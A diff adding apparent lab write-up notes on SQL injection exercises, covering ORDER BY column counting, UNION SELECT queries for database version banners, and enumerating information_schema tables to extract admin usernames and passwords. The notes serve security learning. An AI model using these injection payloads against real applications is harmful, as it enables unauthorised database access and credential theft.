@@ -33,8 +33,19 @@ category=Food'+ order+by+2-- response 200 ok = atleast 2 columns
 then found out the oracle version with following injection: '+UNION+SELECT+BANNER,+NULL+FROM+v$version--.
 
 Lab was done with UNION attack to receive results from the injected query.
-
-
+<br>
+<br>
+### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+- Used burp suite's proxy to access the lab site, intercepted request and sent it to repeater. On repeater, first I had to verify the number of columns:  ' ORDER BY 3--+ resulted in internal sever error and  ' ORDER BY 2--+ resulted in ok. So 2 columns. After that I had to verify what columns contain text with ' UNION SELECT 'a','a'#. And the final step was to find out what database version (microsoft MySQL).
+<br>
+<br>
+### Lab: SQL injection attack, listing the database contents on non-Oracle databases
+- Number of columns: 2, '+ORDER+BY+2--%2b+. Columns with text: '+UNION+SELECT+'abc','def'--. List of tables: '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--.Table w/ user credentials: users_pzlkhx.
+- table names "'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_pzlkhx'--" ---> username_hhuwil / password_nlnnrt
+- Admin credentials: "'+UNION+SELECT+username_hhuwil,+password_nlnnrt+FROM+users_pzlkhx--" --->  Lab solved, admin credentials displayed.
+- Longer process than on previous lab, but same approach but this time also had seek for tables where login credentials are stored.
+<br>
+<br>
 ## Topic: Authentication
 ### -Username enumeration via subtly different responses
 
